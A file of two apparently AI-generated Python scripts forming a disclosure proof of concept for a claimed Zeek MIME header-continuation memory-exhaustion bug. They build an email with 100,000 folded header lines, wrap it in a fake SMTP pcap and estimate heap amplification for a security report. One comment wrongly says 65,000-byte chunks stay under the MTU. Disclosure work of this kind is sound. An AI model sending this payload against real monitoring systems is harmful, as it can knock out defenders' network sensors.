#!/usr/bin/env python3
#
# This script is entirely AI generated. It uses a user's AI generated script in order to create a
# .eml file. The contents of that script are at the end, in main().
"""
zeek_mime_gen_pcap.py

Wraps zeek_mime_poc.eml in a syntactically correct SMTP/TCP session and
writes a PCAP that Zeek can process with its SMTP + MIME analyzers.

Usage:
    pip install scapy
    python3 zeek_mime_gen_pcap.py          # writes zeek_mime_poc.pcap
    zeek -r zeek_mime_poc.pcap smtp
"""

import os
import sys
import time

try:
    from scapy.all import (
        IP,
        TCP,
        Ether,
        wrpcap,
    )
except ImportError:
    sys.exit("scapy not found — run:  pip install scapy")

# ── tunables ────────────────────────────────────────────────────────────────
EML_PATH = os.path.join(os.path.dirname(__file__), "zeek_mime_poc.eml")
PCAP_PATH = os.path.join(os.path.dirname(__file__), "zeek_mime_poc.pcap")

CLIENT_IP = "192.0.2.10"
SERVER_IP = "192.0.2.20"
CLIENT_PORT = 54321
SERVER_PORT = 25  # SMTP; use 587 for submission if needed

EHLO_DOMAIN = "attacker.evil"
MAIL_FROM = "exploit@attacker.evil"
RCPT_TO = "victim@target.example"

# ── read the RFC2822 payload ─────────────────────────────────────────────────
with open(EML_PATH, "rb") as f:
    eml_bytes = f.read()

# The .eml already ends with \r\n.\r\n (DATA terminator).
# Scapy sends it verbatim as the DATA body.
if not eml_bytes.endswith(b"\r\n.\r\n"):
    # Tolerate missing terminator
    if eml_bytes.endswith(b".\r\n"):
        pass  # fine
    else:
        eml_bytes += b"\r\n.\r\n"

# ── build the SMTP conversation ──────────────────────────────────────────────
# Each entry: (direction, bytes)  direction: "c2s" | "s2c"
CRLF = b"\r\n"

smtp_dialog = [
    # TCP handshake is implicit — scapy handles SYN/SYN-ACK/ACK separately
    ("s2c", b"220 mail.target.example ESMTP ready" + CRLF),
    ("c2s", b"EHLO " + EHLO_DOMAIN.encode() + CRLF),
    ("s2c", b"250-mail.target.example Hello" + CRLF + b"250 OK" + CRLF),
    ("c2s", b"MAIL FROM:<" + MAIL_FROM.encode() + b">" + CRLF),
    ("s2c", b"250 OK" + CRLF),
    ("c2s", b"RCPT TO:<" + RCPT_TO.encode() + b">" + CRLF),
    ("s2c", b"250 OK" + CRLF),
    ("c2s", b"DATA" + CRLF),
    ("s2c", b"354 Start mail input; end with <CRLF>.<CRLF>" + CRLF),
    # The full RFC2822 message (headers + 100k continuation lines + body + ".\r\n")
    ("c2s", eml_bytes),
    ("s2c", b"250 OK: message accepted" + CRLF),
    ("c2s", b"QUIT" + CRLF),
    ("s2c", b"221 Bye" + CRLF),
]

# ── packet construction ───────────────────────────────────────────────────────
packets = []
ts = time.time()


def pkt(src_ip, dst_ip, sport, dport, seq, ack, flags, payload=b"", ts_=None):
    p = (
        Ether()
        / IP(src=src_ip, dst=dst_ip)
        / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=flags)
        / payload
    )
    p.time = ts_ or ts
    return p


# seq numbers
c_seq = 1000
s_seq = 2000

# 3-way handshake
packets.append(
    pkt(CLIENT_IP, SERVER_IP, CLIENT_PORT, SERVER_PORT, c_seq, 0, "S", ts_=ts)
)
ts += 0.001
c_seq += 1

packets.append(
    pkt(SERVER_IP, CLIENT_IP, SERVER_PORT, CLIENT_PORT, s_seq, c_seq, "SA", ts_=ts)
)
ts += 0.001
s_seq += 1

packets.append(
    pkt(CLIENT_IP, SERVER_IP, CLIENT_PORT, SERVER_PORT, c_seq, s_seq, "A", ts_=ts)
)
ts += 0.001

# data exchange
CHUNK = 65000  # split large payloads so individual frames stay < MTU


def send_data(src_ip, dst_ip, sport, dport, src_seq, dst_seq, data, flags_first="PA"):
    """Yields (new_src_seq, new_dst_seq) after pushing data in chunks."""
    offset = 0
    while offset < len(data):
        chunk = data[offset : offset + CHUNK]
        offset += CHUNK
        flag = flags_first if offset - CHUNK == 0 else "PA"
        packets.append(
            pkt(src_ip, dst_ip, sport, dport, src_seq, dst_seq, flag, chunk, ts_=ts)
        )
        src_seq += len(chunk)
        # ACK from the other side
        packets.append(
            pkt(dst_ip, src_ip, dport, sport, dst_seq, src_seq, "A", ts_=ts + 0.0001)
        )
    return src_seq, dst_seq


for direction, payload in smtp_dialog:
    ts += 0.002
    if direction == "c2s":
        c_seq, s_seq = send_data(
            CLIENT_IP, SERVER_IP, CLIENT_PORT, SERVER_PORT, c_seq, s_seq, payload
        )
    else:
        s_seq, c_seq = send_data(
            SERVER_IP, CLIENT_IP, SERVER_PORT, CLIENT_PORT, s_seq, c_seq, payload
        )

# FIN/ACK teardown
ts += 0.005
packets.append(
    pkt(CLIENT_IP, SERVER_IP, CLIENT_PORT, SERVER_PORT, c_seq, s_seq, "FA", ts_=ts)
)
c_seq += 1
ts += 0.001
packets.append(
    pkt(SERVER_IP, CLIENT_IP, SERVER_PORT, CLIENT_PORT, s_seq, c_seq, "FA", ts_=ts)
)
s_seq += 1
ts += 0.001
packets.append(
    pkt(CLIENT_IP, SERVER_IP, CLIENT_PORT, SERVER_PORT, c_seq, s_seq, "A", ts_=ts)
)

# ── write PCAP ───────────────────────────────────────────────────────────────
wrpcap(PCAP_PATH, packets)
print(f"Wrote {len(packets)} packets → {PCAP_PATH}")
print()
print("To trigger the vulnerability in Zeek:")
print(f"  zeek -r {PCAP_PATH} protocols/smtp")
print()
print("Watch for: smtp.log (should show the message) and notice.log / weird.log")
print("Monitor RSS with:  /usr/bin/time -v zeek -r zeek_mime_poc.pcap protocols/smtp")


#!/usr/bin/env python3
"""
zeek_mime_poc.py
Proof-of-concept demonstrating CVE candidate: Zeek MIME header continuation
unbounded memory accumulation (CWE-400).

Does NOT connect to anything. Generates payload and calculates impact.

Affected code:
  src/analyzer/protocol/mime/MIME.cc
  - MIME_Entity::Deliver()    line 531-533  (routes to ContHeader if is_lws)
  - MIME_Entity::ContHeader() line 626-636  (no size guard)
  - MIME_Multiline::append()  line 382-384  (unconditional push_back)

Vulnerable path (SMTP):
  TCP stream → ContentLine_Analyzer → SMTP_Analyzer::ProcessData
  → MIME_Mail::Deliver → MIME_Entity::Deliver → ContHeader → MIME_Multiline::append
  → std::vector::push_back(new String(...))  ← no upper bound

Vulnerable path (HTTP multipart):
  TCP stream → ContentLine_Analyzer → HTTP_Analyzer → HTTP_Entity::Deliver
  (HTTP_Entity final : public MIME_Entity, inherits ContHeader)
  → same MIME_Entity::Deliver → ContHeader → MIME_Multiline::append
"""

import os
import sys

# ─────────────────────────────────────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────────────────────────────────────
SMTP_EHLO_DOMAIN = "attacker.evil"
SMTP_MAIL_FROM = "exploit@attacker.evil"
SMTP_RCPT_TO = "victim@target.example"
CONTINUATION_COUNT = 100_000  # number of folded continuation lines
CONTINUATION_BYTE = b" x"  # each continuation: space + 1 char (LWS prefix = space)
CRLF = b"\r\n"

# Memory model (64-bit Linux, glibc malloc)
# zeek::String object members (ZeekString.h:169-176):
#   byte_vec b      = pointer  → 8 bytes
#   int n           = int      → 4 bytes
#   bool final_NUL  = bool     → 1 byte
#   bool use_free   = bool     → 1 byte
#   padding                    → 2 bytes
#   TOTAL OBJECT              = 16 bytes
#
# glibc malloc chunk minimum = 32 bytes (16-byte metadata + min 16-byte payload)
# So `new String` heap chunk  ≥ 32 bytes
STRING_OBJECT_BYTES = 32  # malloc chunk for the String object itself

# String data allocation: new u_char[len + 1] inside String constructor
# For " x\0" = 3 bytes → glibc rounds up to 32-byte chunk
STRING_DATA_BYTES = 32  # malloc chunk for data buffer inside String

# const String* pointer stored in std::vector<const String*> buffer
VECTOR_PTR_BYTES = 8  # pointer size on 64-bit

# Total heap per continuation line:
BYTES_PER_LINE_HEAP = STRING_OBJECT_BYTES + STRING_DATA_BYTES + VECTOR_PTR_BYTES
# = 32 + 32 + 8 = 72 bytes

# Wire bytes per continuation line (" x\r\n")
BYTES_PER_LINE_WIRE = len(CONTINUATION_BYTE + CRLF)  # 4 bytes


# ─────────────────────────────────────────────────────────────────────────────
# Build the SMTP payload
# ─────────────────────────────────────────────────────────────────────────────
def build_smtp_session(n_continuations: int) -> bytes:
    """
    Builds a complete SMTP session DATA payload that triggers the vulnerability.
    Each " x\\r\\n" continuation line calls:
      MIME_Entity::ContHeader() → MIME_Multiline::append() → push_back(new String())
    """
    lines = []

    # SMTP command phase (not part of DATA, shown for context)
    lines.append(b"# [CLIENT] EHLO " + SMTP_EHLO_DOMAIN.encode() + CRLF)
    lines.append(b"# [CLIENT] MAIL FROM:<" + SMTP_MAIL_FROM.encode() + b">" + CRLF)
    lines.append(b"# [CLIENT] RCPT TO:<" + SMTP_RCPT_TO.encode() + b">" + CRLF)
    lines.append(b"# [CLIENT] DATA" + CRLF)
    lines.append(b"# [SERVER] 354 Start mail input" + CRLF)

    # RFC 2822 message — what Zeek parses via MIME_Entity
    # These lines are what arrives at MIME_Entity::Deliver() one by one
    lines.append(b"--- BEGIN RFC2822 MESSAGE (what MIME_Entity receives) ---" + CRLF)

    # A normal first header line (triggers NewHeader → FinishHeader for any previous header)
    lines.append(b"From: exploit@attacker.evil" + CRLF)

    # The attack header: Subject with N continuation lines
    # First line calls NewHeader() (MIME.cc:614), creates new MIME_Multiline
    lines.append(b"Subject: CVE-CANDIDATE" + CRLF)

    # Each continuation line (starts with SP = 0x20) calls ContHeader() (MIME.cc:531-533)
    # which calls MIME_Multiline::append() (MIME.cc:636)
    # which calls buffer.push_back(new String(" x", 2, true)) (MIME.cc:383)
    # ← no size check anywhere in this chain
    for _ in range(n_continuations):
        lines.append(CONTINUATION_BYTE + CRLF)  # " x\r\n"

    # Empty line signals end of headers → triggers FinishHeader() on the Subject header
    # This is when get_concatenated_line() is called, allocating the combined string
    lines.append(CRLF)

    # Minimal body
    lines.append(b"This is the body." + CRLF)

    # End of DATA
    lines.append(b"." + CRLF)

    lines.append(b"--- END RFC2822 MESSAGE ---" + CRLF)
    return b"".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# Memory impact calculation
# ─────────────────────────────────────────────────────────────────────────────
def calculate_memory_impact(n: int) -> dict:
    wire_bytes = n * BYTES_PER_LINE_WIRE
    heap_string_obj = n * STRING_OBJECT_BYTES
    heap_string_data = n * STRING_DATA_BYTES
    heap_vector_ptr = n * VECTOR_PTR_BYTES
    heap_subtotal = n * BYTES_PER_LINE_HEAP

    # During FinishHeader(), get_concatenated_line() allocates one big String
    # of total data length = n * len(CONTINUATION_BYTE) = n * 2 bytes
    concat_data_len = n * len(CONTINUATION_BYTE)
    concat_overhead = 32 + 32  # String object chunk + data chunk
    concat_total = concat_data_len + concat_overhead

    total_heap_peak = heap_subtotal + concat_total
    amplification = total_heap_peak / wire_bytes if wire_bytes > 0 else 0

    return {
        "n_lines": n,
        "wire_bytes": wire_bytes,
        "heap_string_objects": heap_string_obj,
        "heap_string_data": heap_string_data,
        "heap_vector_ptrs": heap_vector_ptr,
        "heap_subtotal": heap_subtotal,
        "concat_data_len": concat_data_len,
        "concat_overhead": concat_overhead,
        "concat_total": concat_total,
        "total_heap_peak": total_heap_peak,
        "amplification": amplification,
    }


def human(n: int) -> str:
    if n >= 1_000_000_000:
        return f"{n / 1e9:.1f} GB"
    if n >= 1_000_000:
        return f"{n / 1e6:.1f} MB"
    if n >= 1_000:
        return f"{n / 1e3:.1f} KB"
    return f"{n} B"


# ─────────────────────────────────────────────────────────────────────────────
# Self-check
# ─────────────────────────────────────────────────────────────────────────────
def self_check():
    impact = calculate_memory_impact(1)
    assert impact["wire_bytes"] == BYTES_PER_LINE_WIRE, "wire bytes mismatch"
    assert impact["heap_subtotal"] == BYTES_PER_LINE_HEAP, "heap subtotal mismatch"
    assert impact["total_heap_peak"] > impact["wire_bytes"], (
        "peak must exceed wire bytes"
    )

    impact_10 = calculate_memory_impact(10)
    assert impact_10["n_lines"] == 10, "line count mismatch"
    assert impact_10["wire_bytes"] == 10 * BYTES_PER_LINE_WIRE, (
        "10-line wire bytes wrong"
    )

    # Amplification must be > 1x
    assert impact_10["amplification"] > 1.0, "amplification must be > 1"
    print("[SELF-CHECK] All assertions passed ✓")


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    print("=" * 70)
    print("Zeek MIME Header Continuation — CVE Candidate PoC")
    print("CWE-400: Uncontrolled Resource Consumption")
    print("Affected: src/analyzer/protocol/mime/MIME.cc")
    print("=" * 70)
    print()

    # Self-check first
    self_check()
    print()

    # ── Code path explanation ─────────────────────────────────────────────
    print("=" * 70)
    print("ZEEK SOURCE LINES TRIGGERED (in order)")
    print("=" * 70)
    print("""
  [1] ContentLine_Analyzer::ForwardStream() delivers each " x" line (2 bytes)
      to SMTP_Analyzer via the support-analyzer chain

  [2] SMTP_Analyzer::ProcessData() [SMTP.cc:861-862]
        void SMTP_Analyzer::ProcessData(int length, const char* line) {
            mail->Deliver(length, line, true /* trailing_CRLF */);
        }

  [3] MIME_Message::Deliver() [MIME.h:211-213]
        virtual void Deliver(int len, const char* data, bool trailing_CRLF) {
            top_level->Deliver(len, data, trailing_CRLF);  // top_level = MIME_Entity*
        }

  [4] MIME_Entity::Deliver() [MIME.cc:514, 531-533]
        void MIME_Entity::Deliver(int len, const char* data, bool trailing_CRLF) {
            if ( in_header ) {
                ...
                else if ( is_lws(*data) )      // ' ' (0x20) → true
                    ContHeader(len, data);     // ← called for EVERY continuation line
                ...
            }
        }

  [5] MIME_Entity::ContHeader() [MIME.cc:626-636]  ← VULNERABLE FUNCTION
        void MIME_Entity::ContHeader(int len, const char* data) {
            if ( current_header_line == nullptr ) { ... }
            current_header_line->append(len, data);  // ← NO SIZE GUARD
        }

  [6] MIME_Multiline::append() [MIME.cc:382-384]  ← UNBOUNDED GROWTH
        void MIME_Multiline::append(int len, const char* data) {
            buffer.push_back(new String(   // ← heap allocation, no limit
                reinterpret_cast<const u_char*>(data), len, true));
        }

  [7] When the empty line (end of headers) arrives → FinishHeader() [MIME.cc:639]
        MIME_Header* h = new MIME_Header(current_header_line);
        // Inside MIME_Header ctor: get_concatenated_line() called
        // → concatenate() allocates ONE BIG string of all continuation data
""")

    # ── Impact calculation ────────────────────────────────────────────────
    print("=" * 70)
    print("MEMORY IMPACT CALCULATION")
    print("=" * 70)
    print()
    print("  zeek::String object size (from ZeekString.h:169-176):")
    print("    byte_vec b              = 8 bytes  (pointer)")
    print("    int n                   = 4 bytes  (length)")
    print("    bool final_NUL          = 1 byte")
    print("    bool use_free_to_delete = 1 byte")
    print("    padding                 = 2 bytes")
    print("    Object total            = 16 bytes")
    print("    glibc malloc chunk      = 32 bytes (min chunk size)")
    print()
    print(
        "  Per continuation line (' x\\r\\n', 4 wire bytes, delivers ' x' = 2 bytes):"
    )
    print(f"    STRING_OBJECT_BYTES   = {STRING_OBJECT_BYTES:5d}  (new String object)")
    print(
        f"    STRING_DATA_BYTES     = {STRING_DATA_BYTES:5d}  (new u_char[3] inside String)"
    )
    print(
        f"    VECTOR_PTR_BYTES      = {VECTOR_PTR_BYTES:5d}  (const String* in buffer vector)"
    )
    print(f"    TOTAL per line (heap) = {BYTES_PER_LINE_HEAP:5d}  bytes")
    print(f"    Wire bytes per line   = {BYTES_PER_LINE_WIRE:5d}  bytes (' x\\r\\n')")
    print()

    scenarios = [
        (1_000, "proof of concept"),
        (100_000, "practical attack"),
        (1_000_000, "severe attack"),
    ]

    for n, label in scenarios:
        imp = calculate_memory_impact(n)
        print(f"  Scenario: {n:>10,} continuation lines  [{label}]")
        print(f"    Wire traffic sent:         {human(imp['wire_bytes']):>12}")
        print(f"    Heap (String objects):     {human(imp['heap_string_objects']):>12}")
        print(f"    Heap (String data bufs):   {human(imp['heap_string_data']):>12}")
        print(f"    Heap (vector pointers):    {human(imp['heap_vector_ptrs']):>12}")
        print(f"    Heap sub-total:            {human(imp['heap_subtotal']):>12}")
        print(
            f"    Concat string at finish:   {human(imp['concat_total']):>12}  "
            f"(+{human(imp['concat_data_len'])} data + {imp['concat_overhead']}B overhead)"
        )
        print(f"    PEAK heap allocated:       {human(imp['total_heap_peak']):>12}")
        print(f"    Amplification factor:      {imp['amplification']:.1f}x")
        print()

    # ── Generate the payload ─────────────────────────────────────────────
    print("=" * 70)
    print(
        f"SMTP PAYLOAD (first 30 lines shown, total {CONTINUATION_COUNT:,} continuation lines)"
    )
    print("=" * 70)
    print()

    payload = build_smtp_session(CONTINUATION_COUNT)
    lines = payload.split(CRLF)

    # Show first and last few lines
    SHOW_HEAD = 12
    SHOW_TAIL = 5
    for i, line in enumerate(lines[:SHOW_HEAD]):
        try:
            decoded = line.decode("ascii")
        except Exception:
            decoded = repr(line)
        print(f"  [{i + 1:05d}] {decoded}")

    print(
        f"  [...]   (lines {SHOW_HEAD + 1:,} to {len(lines) - SHOW_TAIL - 1:,}: "
        f"each is ' x' = b'\\x20\\x78' ← triggers ContHeader)"
    )
    print("  [...]\n")

    for i, line in enumerate(lines[-SHOW_TAIL:], start=len(lines) - SHOW_TAIL):
        try:
            decoded = line.decode("ascii")
        except Exception:
            decoded = repr(line)
        print(f"  [{i + 1:05d}] {decoded}")

    print()
    print(f"  Total payload size: {human(len(payload))} ({len(payload):,} bytes)")

    # ── Save to file ─────────────────────────────────────────────────────
    out_path = r"C:\BugBounty\zeek_mime_poc.eml"
    # Save only the RFC2822 message part (what Zeek's MIME parser actually sees)
    rfc_start = b"--- BEGIN RFC2822 MESSAGE (what MIME_Entity receives) ---\r\n"
    rfc_end = b"--- END RFC2822 MESSAGE ---\r\n"
    idx_s = payload.find(rfc_start) + len(rfc_start)
    idx_e = payload.find(rfc_end)
    rfc_payload = payload[idx_s:idx_e]

    with open(out_path, "wb") as f:
        f.write(rfc_payload)
    print(f"  Saved RFC2822 message to: {out_path}")
    print("  (This is what Zeek's MIME parser receives after SMTP DATA handshake)")
    print()

    # ── Summary ──────────────────────────────────────────────────────────
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    imp = calculate_memory_impact(CONTINUATION_COUNT)
    print(f"""
  Vulnerability: Zeek MIME_Entity::ContHeader() / MIME_Multiline::append()
  File:          src/analyzer/protocol/mime/MIME.cc:382-384, 626-636
  CWE:           CWE-400 (Uncontrolled Resource Consumption)
  CVSS:          AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H = 7.5 (High)

  Trigger:       Send an SMTP or HTTP message with a MIME header containing
                 N continuation lines (lines starting with whitespace).
                 Each line: " x\\r\\n" = 4 bytes on the wire.

  Impact ({CONTINUATION_COUNT:,} lines):
    Wire traffic:   {human(imp["wire_bytes"])} of SMTP data
    Zeek heap use:  {human(imp["total_heap_peak"])} (peak during header processing)
    Amplification:  {imp["amplification"]:.0f}x

  Affected paths:
    • SMTP DATA phase (via SMTP_Analyzer → MIME_Mail → MIME_Entity)
    • HTTP multipart body headers (via HTTP_Entity inheriting MIME_Entity)

  No fix in CHANGES file. No existing test coverage. No cap in source.
""")

    # ── Final assertion ───────────────────────────────────────────────────
    print("=" * 70)
    print("ASSERTION CHECKS")
    print("=" * 70)
    assert BYTES_PER_LINE_WIRE == 4, (
        f"Wire bytes must be 4 (space+x+CR+LF), got {BYTES_PER_LINE_WIRE}"
    )
    assert BYTES_PER_LINE_HEAP == 72, (
        f"Heap bytes must be 72, got {BYTES_PER_LINE_HEAP}"
    )
    assert imp["amplification"] > 10, (
        f"Amplification must be > 10x, got {imp['amplification']:.1f}x"
    )
    assert imp["total_heap_peak"] > imp["wire_bytes"] * 10, (
        "Heap must exceed wire by 10x"
    )
    assert os.path.exists(out_path), f"Output file not written: {out_path}"
    print("  All assertions passed ✓")
    print()
    print("  The .eml file is ready to be attached to the security@zeek.org report.")


if __name__ == "__main__":
    main()
